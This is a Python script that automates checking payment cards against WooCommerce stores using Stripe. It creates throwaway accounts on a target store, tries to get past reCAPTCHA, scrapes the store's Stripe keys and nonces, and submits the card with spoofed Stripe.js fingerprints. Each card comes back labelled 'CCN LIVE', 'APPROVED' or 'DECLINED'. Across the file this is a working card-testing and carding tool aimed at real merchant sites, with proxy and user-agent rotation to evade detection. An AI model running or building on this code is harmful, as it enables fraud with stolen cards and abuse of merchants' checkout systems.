"""
Stripe Auto Auth API (WooCommerce Stripe) — All varieties
========================================================
Supports all common WooCommerce account paths: /my-account/, /account/, /my-account-2/, etc.
1. Discover account path (my-account, account, customer-area, ...)
2. GET account_path → parse woocommerce-register-nonce
3. POST account_path (register) with optional reCAPTcha bypass
4. GET account_path + add-payment-method → parse Stripe keys & nonce
5. POST api.stripe.com/v1/payment_methods
6. POST wp-admin/admin-ajax.php (create_setup_intent / wc_stripe_create_and_confirm_setup_intent)
Reference: starr-shop.eu, melearning.co.uk, nostomachforcancer.org, etc.
"""

import re
import json
import asyncio
import random
import string
import base64
import logging
from typing import Dict, Optional, Tuple
from urllib.parse import urlparse, parse_qs

import aiohttp

logger = logging.getLogger(__name__)

# Retry: transient errors (404, 5xx, timeout, network, captcha) — no repeated high errors to user
MAX_AUTH_RETRIES = 2  # 3 attempts total
RETRY_DELAY_SEC = 1.5
RETRIABLE_RESPONSES = frozenset({
    "SITE_HTTP_ERROR", "SITE_ERROR", "CAPTCHA_BLOCK", "TIMEOUT", "NETWORK_ERROR", "ERROR",
})

# Common WooCommerce account path variants (order matters: try URL hint first, then common)
ACCOUNT_PATH_CANDIDATES = [
    "/my-account/",
    "/account/",
    "/my-account-2/",
    "/myaccount/",
    "/customer-area/",
    "/customer-dashboard/",
    "/dashboard/",
    "/login/",
    "/my-account-3/",
    "/account-2/",
]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
]


def _random_email() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "@gmail.com"


def _random_password() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=12))


def _extract_base_and_path_hint(site_url: str) -> Tuple[str, Optional[str]]:
    """Return (base_url, path_hint). path_hint e.g. /account/ from .../account/add-payment-method/."""
    url = site_url.strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    parsed = urlparse(url)
    base = f"{parsed.scheme or 'https'}://{parsed.netloc}".rstrip("/")
    path = (parsed.path or "").strip().rstrip("/")
    if not path:
        return base, None
    parts = [p for p in path.split("/") if p]
    if not parts:
        return base, None
    first_seg = parts[0].lower()
    for known in ("account", "my-account", "myaccount", "customer-area", "dashboard", "login", "my-account-2", "account-2", "customer-dashboard"):
        if first_seg == known or first_seg.startswith(known + "-") or first_seg.startswith(known + "2"):
            return base, "/" + parts[0] + "/"
    if "account" in first_seg or "my-account" in first_seg:
        return base, "/" + parts[0] + "/"
    return base, None


def _looks_like_woo_account(html: str) -> bool:
    """True if page looks like WooCommerce account (register, login, add-payment-method, Stripe)."""
    if not html:
        return False
    h = html.lower()
    return (
        "woocommerce" in h
        or "register" in h
        or "add-payment-method" in h
        or "payment-method" in h
        or "pk_live_" in h
        or "pk_test_" in h
        or "publishablekey" in h
        or "stripe" in h
        or "my-account" in h
        or 'name="woocommerce-register-nonce"' in h
        or "lost your password" in h
        or "customer-area" in h
    )


async def _discover_account_path(
    session: aiohttp.ClientSession,
    base: str,
    path_hint: Optional[str],
    headers: Dict[str, str],
    proxy: Optional[str],
) -> Optional[str]:
    """Try account path candidates; return prefix with trailing slash (e.g. /my-account/) or None."""
    candidates = list(ACCOUNT_PATH_CANDIDATES)
    if path_hint:
        path_hint = path_hint if path_hint.endswith("/") else path_hint + "/"
        if path_hint not in candidates:
            candidates.insert(0, path_hint)
    for prefix in candidates:
        prefix = prefix if prefix.endswith("/") else prefix + "/"
        url = base.rstrip("/") + prefix
        try:
            async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status != 200:
                    continue
                html = await resp.text()
                if _looks_like_woo_account(html):
                    return prefix
        except Exception:
            continue
    return None


def _captcha_detected(text: str) -> bool:
    if not text:
        return False
    t = text.lower()
    return any(
        re.search(p, t)
        for p in [
            r"captcha",
            r"recaptcha",
            r"g-recaptcha",
            r"hcaptcha",
            r"data-sitekey",
            r"cf-chl-captcha",
            r"cloudflare",
            r"are you human",
            r"verify you are human",
        ]
    )


async def _recaptcha_bypass(session: aiohttp.ClientSession, page_html: str, page_url: str) -> Optional[str]:
    """Async reCAPTcha bypass: anchor → reload → rresp token."""
    sitekey_m = re.search(r'data-sitekey=["\']([^"\']+)["\']', page_html, re.IGNORECASE)
    if not sitekey_m:
        return None
    sitekey = sitekey_m.group(1)
    origin_encoded = base64.b64encode(page_url.encode()).decode().rstrip("=")
    anchor_url = (
        f"https://www.google.com/recaptcha/api2/anchor?"
        f"ar=1&k={sitekey}&co={origin_encoded}&hl=en&v=...&size=invisible"
    )
    reload_url = f"https://www.google.com/recaptcha/api2/reload?k={sitekey}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        async with session.get(anchor_url, headers=headers, timeout=aiohttp.ClientTimeout(total=12)) as resp:
            if resp.status != 200:
                return None
            anchor_text = await resp.text()
        token_m = re.search(r'value=["\']([^"\']+)["\']', anchor_text)
        if not token_m:
            return None
        token = token_m.group(1)
        parsed = urlparse(anchor_url)
        params = parse_qs(parsed.query)
        post_data = {
            "v": (params.get("v") or [""])[0],
            "reason": "q",
            "c": token,
            "k": sitekey,
            "co": (params.get("co") or [""])[0],
            "hl": "en",
            "size": "invisible",
        }
        post_headers = {
            **headers,
            "Referer": anchor_url,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.google.com",
        }
        async with session.post(reload_url, headers=post_headers, data=post_data, timeout=aiohttp.ClientTimeout(total=15)) as r2:
            if r2.status != 200:
                return None
            reload_text = await r2.text()
        rresp_m = re.search(r'\["rresp","([^"]+)"', reload_text)
        if not rresp_m:
            return None
        return rresp_m.group(1)
    except Exception as e:
        logger.debug(f"reCAPTcha bypass failed: {e}")
        return None


async def auto_stripe_auth(
    site_url: str,
    card: str,
    session: Optional[aiohttp.ClientSession] = None,
    proxy: Optional[str] = None,
    timeout_seconds: int = 45,
) -> Dict:
    """
    Full WooCommerce Stripe auth: register → add-payment-method → Stripe PM → create_setup_intent.
    card: "cc|mm|yy|cvv"
    Returns: { success, response, message, card, site, payment_method_id?, login_email?, login_password? }
    """
    result = {
        "success": False,
        "response": "UNKNOWN",
        "message": "Unknown error",
        "card": card,
        "site": site_url.rstrip("/"),
        "payment_method_id": None,
        "login_email": None,
        "login_password": None,
    }
    parts = card.replace(" ", "").split("|")
    if len(parts) < 4:
        result["message"] = "Invalid card format"
        return result
    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
    exp_year = ano[-2:] if len(ano) == 4 else ano
    exp_month = mes.zfill(2) if len(mes) == 1 else mes

    base, path_hint = _extract_base_and_path_hint(site_url)
    base = base.rstrip("/")

    ua = random.choice(USER_AGENTS)
    headers_base = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": ua,
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=timeout_seconds)
    own_session = session is None
    if session is None:
        session = aiohttp.ClientSession(timeout=timeout, connector=connector)

    for attempt in range(MAX_AUTH_RETRIES + 1):
        if attempt > 0:
            if own_session and session:
                await session.close()
            session = aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False))
            await asyncio.sleep(RETRY_DELAY_SEC)

        try:
            # 0) Discover account path (my-account, account, customer-area, etc.)
            account_prefix = await _discover_account_path(session, base, path_hint, headers_base, proxy)
            if not account_prefix:
                account_prefix = "/my-account/"
            acc_path = account_prefix.strip("/")
            account_url = f"{base}/{acc_path}/" if acc_path else f"{base}/"
            referer_path = "/" + acc_path + "/" if acc_path else "/my-account/"

            # 1) GET account page → nonce (if 404, try other account path candidates)
            html_reg = None
            resp_status = None
            async with session.get(
                account_url,
                headers=headers_base,
                proxy=proxy,
            ) as resp:
                resp_status = resp.status
                if resp.status == 200:
                    html_reg = await resp.text()
            if resp_status != 200 or not html_reg:
                # Fallback: try path_hint and other candidates so 404 on /my-account/ doesn't fail sites that use /account/ or /customer-area/
                fallback_candidates = list(ACCOUNT_PATH_CANDIDATES)
                if path_hint:
                    ph = path_hint if path_hint.endswith("/") else path_hint + "/"
                    if ph not in fallback_candidates:
                        fallback_candidates.insert(0, ph)
                for prefix in fallback_candidates:
                    prefix = prefix if prefix.endswith("/") else prefix + "/"
                    if prefix == account_prefix:
                        continue
                    try_url = base.rstrip("/") + prefix
                    try:
                        async with session.get(try_url, headers=headers_base, proxy=proxy) as resp2:
                            if resp2.status == 200:
                                html_reg = await resp2.text()
                                if html_reg and _looks_like_woo_account(html_reg):
                                    account_url = try_url
                                    acc_path = prefix.strip("/")
                                    referer_path = prefix
                                    break
                    except Exception:
                        continue
                if not html_reg or not _looks_like_woo_account(html_reg):
                    result["response"] = "SITE_HTTP_ERROR"
                    result["message"] = f"Account page returned {resp_status or 404} (tried account paths; none returned WooCommerce)"
                    break
            if not html_reg:
                result["response"] = "SITE_HTTP_ERROR"
                result["message"] = f"Account page returned {resp_status}"
                break

            nonce_m = re.search(r'name=["\']woocommerce-register-nonce["\'][^>]+value=["\']([^"\']+)["\']', html_reg)
            if not nonce_m:
                nonce_m = re.search(r'value=["\']([^"\']+)["\'][^>]+name=["\']woocommerce-register-nonce["\']', html_reg)
            if not nonce_m:
                nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([^"\']+)["\']', html_reg)
            if not nonce_m:
                result["response"] = "SITE_ERROR"
                result["message"] = "Registration nonce not found"
                break
            reg_nonce = nonce_m.group(1)

            email = _random_email()
            password = _random_password()
            result["login_email"] = email
            result["login_password"] = password

            data_register = {
                "email": email,
                "password": password,
                "wc_order_attribution_source_type": "typein",
                "wc_order_attribution_referrer": "(none)",
                "woocommerce-register-nonce": reg_nonce,
                "_wp_http_referer": referer_path,
                "register": "Register",
            }
            reg_headers = {
                **headers_base,
                "Origin": base,
                "Referer": account_url,
                "Content-Type": "application/x-www-form-urlencoded",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            }

            async with session.post(
                account_url,
                headers=reg_headers,
                data=data_register,
                proxy=proxy,
            ) as resp:
                html1 = await resp.text()

            if _captcha_detected(html1):
                g_token = await _recaptcha_bypass(session, html1, account_url)
                if g_token:
                    data_register["g-recaptcha-response"] = g_token
                    async with session.post(
                        account_url,
                        headers=reg_headers,
                        data=data_register,
                        proxy=proxy,
                    ) as resp:
                        html1 = await resp.text()
                if _captcha_detected(html1) or ("registered" not in html1.lower() and "dashboard" not in html1.lower() and "logout" not in html1.lower()):
                    result["response"] = "CAPTCHA_BLOCK"
                    result["message"] = "Registration captcha failed"
                    break

            await asyncio.sleep(0.3)

            # 2) GET payment-methods/ then add-payment-method/ (try with and without trailing slash)
            pay_headers = {
                **headers_base,
                "Referer": account_url,
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            }
            pm_list_url = f"{base}/{acc_path}/payment-methods/" if acc_path else f"{base}/my-account/payment-methods/"
            async with session.get(pm_list_url, headers=pay_headers, proxy=proxy) as resp:
                if resp.status == 200:
                    await resp.text()
            add_pm_candidates = [
                f"{base}/{acc_path}/add-payment-method/",
                f"{base}/{acc_path}/add-payment-method",
                f"{base}/my-account/add-payment-method/",
            ]
            pay_headers["Referer"] = pm_list_url
            html_pay = None
            add_pm_url = None
            for add_pm in add_pm_candidates:
                async with session.get(add_pm, headers=pay_headers, proxy=proxy) as resp:
                    if resp.status == 200:
                        html_pay = await resp.text()
                        add_pm_url = add_pm.rstrip("/") + "/" if not add_pm.endswith("/") else add_pm
                        if _looks_like_woo_account(html_pay) or "pk_live_" in html_pay or "pk_test_" in html_pay or "publishablekey" in html_pay.lower():
                            break
            if not html_pay:
                result["response"] = "SITE_HTTP_ERROR"
                result["message"] = "add-payment-method page not found"
                break

            if _captcha_detected(html_pay):
                g_token = await _recaptcha_bypass(session, html_pay, add_pm_url or add_pm_candidates[0])
                if not g_token:
                    result["response"] = "CAPTCHA_BLOCK"
                    result["message"] = "Payment page captcha failed"
                    break
                async with session.get(
                    add_pm_url or add_pm_candidates[0],
                    headers=pay_headers,
                    proxy=proxy,
                ) as resp:
                    if resp.status == 200:
                        html_pay = await resp.text()

            # Publishable key: JSON "publishableKey" first, then raw pk_live_/pk_test_ (e.g. starr-shop.eu)
            pks = None
            pks_m = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', html_pay)
            if pks_m:
                pks = pks_m.group(1).strip()
            if not pks:
                pk_raw = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html_pay)
                if pk_raw:
                    pks = pk_raw.group(0)
            if not pks:
                result["response"] = "STRIPE_KEYS_MISSING"
                result["message"] = "Stripe publishable key (publishableKey or pk_live_/pk_test_) not found"
                return result

            # accountId optional (WooCommerce Stripe Gateway often omits it; Connect uses it)
            acct = None
            acct_m = re.search(r'"accountId"\s*:\s*"([^"]+)"', html_pay)
            if acct_m:
                acct = acct_m.group(1).strip()

            # Nonce: multiple patterns for WC Payments vs WC Stripe Gateway (starr-shop.eu uses createAndConfirmSetupIntentNonce / _ajax_nonce)
            nonce = None
            nonce_patterns = [
                r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']',
                r'createSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']',
                r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
                r'"createSetupIntentNonce"\s*:\s*"([^"]+)"',
                r'"_ajax_nonce["\']?\s*:\s*["\']([^"\']+)["\']',
                r'name=["\']_ajax_nonce["\']\s+value=["\']([^"\']+)["\']',
                r'value=["\']([^"\']+)["\'][^>]*name=["\']_ajax_nonce["\']',
                r'nonce["\']?\s*:\s*["\']([^"\']+)["\']',
            ]
            for pat in nonce_patterns:
                nonce_m = re.search(pat, html_pay)
                if nonce_m:
                    nonce = nonce_m.group(1).strip()
                    break
            if not nonce:
                nonce_input = re.search(r'<input[^>]+name=["\']_ajax_nonce["\'][^>]+value=["\']([^"\']+)["\']', html_pay)
                if nonce_input:
                    nonce = nonce_input.group(1).strip()
            if not nonce:
                result["response"] = "STRIPE_KEYS_MISSING"
                result["message"] = "Setup intent nonce (_ajax_nonce / createSetupIntentNonce) not found"
                return result

            # 3) POST api.stripe.com/v1/payment_methods — must look like Stripe.js (avoid "integration surface is unsupported")
            stripe_headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            }
            # Card number with spaces (how Stripe.js sends it)
            card_formatted = " ".join([cc[i : i + 4] for i in range(0, len(cc), 4)])
            stripe_data = {
                "type": "card",
                "card[number]": card_formatted,
                "card[cvc]": cvv,
                "card[exp_year]": exp_year,
                "card[exp_month]": exp_month,
                "allow_redisplay": "unspecified",
                "billing_details[address][country]": "US",
                "payment_user_agent": "stripe.js/065b474d33; stripe-js-v3/065b474d33; payment-element; deferred-intent",
                "referrer": base,
                "time_on_page": str(random.randint(30000, 60000)),
                "client_attribution_metadata[client_session_id]": "".join(
                    random.choices(string.ascii_lowercase + string.digits, k=36)
                ),
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "client_attribution_metadata[elements_session_config_id]": "".join(
                    random.choices(string.ascii_lowercase + string.digits, k=36)
                ),
                "key": pks,
                "_stripe_version": "2024-06-20",
                "guid": "".join(random.choices(string.ascii_lowercase + string.digits, k=36)),
                "muid": "".join(random.choices(string.ascii_lowercase + string.digits, k=36)),
                "sid": "".join(random.choices(string.ascii_lowercase + string.digits, k=36)),
            }
            if acct:
                stripe_data["_stripe_account"] = acct
            async with session.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=stripe_headers,
                data=stripe_data,
                proxy=proxy,
            ) as resp:
                pm_text = await resp.text()
            try:
                pm_json = json.loads(pm_text)
            except json.JSONDecodeError:
                result["response"] = "STRIPE_PM_ERROR"
                result["message"] = pm_text[:100]
                return result
            if "error" in pm_json:
                err = pm_json["error"]
                if not isinstance(err, dict):
                    err = {}
                code = err.get("code", "")
                msg = err.get("message", "Unknown")
                result["message"] = msg
                msg_lower = msg.lower()
                # 3DS / action_required = CCN LIVE (card is live)
                if code in ("authentication_required", "action_required", "requires_action") or any(
                    x in msg_lower for x in ["authentication required", "action required", "3d secure", "3ds"]
                ):
                    result["success"] = True
                    result["response"] = "CCN LIVE"
                    result["message"] = result["message"] or "3D Secure (CCN Live)"
                    return result
                if code in ("incorrect_cvc", "invalid_cvc", "incorrect_zip", "postal_code_invalid") or any(
                    x in msg_lower for x in ["cvc", "security code", "zip", "postal"]
                ):
                    result["success"] = True
                    result["response"] = "CCN LIVE"
                else:
                    result["response"] = "DECLINED"
                return result
            pm_id = pm_json.get("id")
            if not pm_id:
                result["response"] = "STRIPE_PM_ERROR"
                result["message"] = "No payment method id"
                return result
            result["payment_method_id"] = pm_id

            # 4) POST admin-ajax.php — try multiple actions (WC Payments vs WC Stripe Gateway e.g. starr-shop.eu)
            def _ajax_data(action_name: str, field_name: str, extra_fields: Optional[Dict[str, str]] = None) -> Dict[str, str]:
                data = {"action": action_name, field_name: pm_id, "_ajax_nonce": nonce}
                if extra_fields:
                    data.update(extra_fields)
                return data

            add_pm_ref = add_pm_url or f"{base}/{acc_path}/add-payment-method/" if acc_path else f"{base}/my-account/add-payment-method/"
            ajax_headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": base,
                "Referer": add_pm_ref,
                "User-Agent": ua,
                "X-Requested-With": "XMLHttpRequest",
            }
            # Try in order: WC Payments, then WC Stripe Gateway (starr-shop.eu uses wc_stripe_create_and_confirm_setup_intent)
            ajax_candidates = [
                ("create_setup_intent", "wcpay-payment-method", None),
                ("create_and_confirm_setup_intent", "wc-stripe-payment-method", None),
                ("wc_stripe_create_and_confirm_setup_intent", "wc-stripe-payment-method", {"wc-stripe-payment-type": "card"}),
            ]
            ajax_text = ""
            for action_name, field_name, extra in ajax_candidates:
                data = _ajax_data(action_name, field_name, extra)
                async with session.post(
                    f"{base}/wp-admin/admin-ajax.php",
                    headers=ajax_headers,
                    data=data,
                    proxy=proxy,
                ) as resp:
                    ajax_text = await resp.text()
                try:
                    parsed = json.loads(ajax_text)
                    if not isinstance(parsed, dict):
                        continue
                    if parsed.get("success") is True:
                        break
                    if parsed.get("success") is False and "data" in parsed:
                        continue
                except json.JSONDecodeError:
                    pass
            # Use last response for parsing below

            try:
                ajax_json = json.loads(ajax_text)
                if not isinstance(ajax_json, dict):
                    result["response"] = "DECLINED"
                    result["message"] = (str(ajax_json) if ajax_text.strip() else "Invalid response")[:200]
                    return result
                data = ajax_json.get("data", {})
                if not isinstance(data, dict):
                    data = {}
                # action_required / 3DS = CCN LIVE (same as starr-shop.eu gate) — check before success
                data_str = str(data).lower()
                if any(x in data_str for x in ["action_required", "action required", "challenge", "authentication_required", "authentication required", "requires_action"]):
                    result["success"] = True
                    result["response"] = "CCN LIVE"
                    result["message"] = "3D Secure / Action required (CCN Live)"
                    return result
                if ajax_json.get("success") is True:
                    result["success"] = True
                    result["response"] = "APPROVED"
                    result["message"] = "Card authenticated"
                    return result
                error_obj = data.get("error")
                if not isinstance(error_obj, dict):
                    error_obj = {}
                err_msg = error_obj.get("message", ajax_text)
                if isinstance(err_msg, dict):
                    err_msg = str(err_msg)
                result["message"] = (err_msg or ajax_text)[:200]
                err_upper = result["message"].upper()
                # CCN LIVE: CVC/AVS/3DS/action required / insufficient
                ccn_patterns = [
                    "SECURITY CODE", "CVC", "CVV", "INCORRECT_CVC", "POSTAL", "ZIP", "ADDRESS", "AVS",
                    "AUTHENTICATION", "3D SECURE", "3DS", "ACTION REQUIRED", "ACTION_REQUIRED",
                    "CHALLENGE", "REQUIRES_ACTION", "INSUFFICIENT", "INCORRECT NUMBER",
                ]
                if any(x in err_upper for x in ccn_patterns):
                    result["success"] = True
                    result["response"] = "CCN LIVE"
                else:
                    result["response"] = "DECLINED"
                return result
            except json.JSONDecodeError:
                if "success" in ajax_text.lower():
                    result["success"] = True
                    result["response"] = "APPROVED"
                    result["message"] = "Setup successful"
                else:
                    result["response"] = "DECLINED"
                    result["message"] = ajax_text[:150]
                return result
        except asyncio.TimeoutError:
            result["response"] = "TIMEOUT"
            result["message"] = "Request timed out"
            break
        except aiohttp.ClientError as e:
            result["response"] = "NETWORK_ERROR"
            result["message"] = str(e)[:80]
            break
        except Exception as e:
            result["response"] = "ERROR"
            result["message"] = str(e)[:100]
            break
        finally:
            if own_session and session:
                await session.close()
        if attempt < MAX_AUTH_RETRIES and result.get("response") in RETRIABLE_RESPONSES:
            continue
        return result
    return result
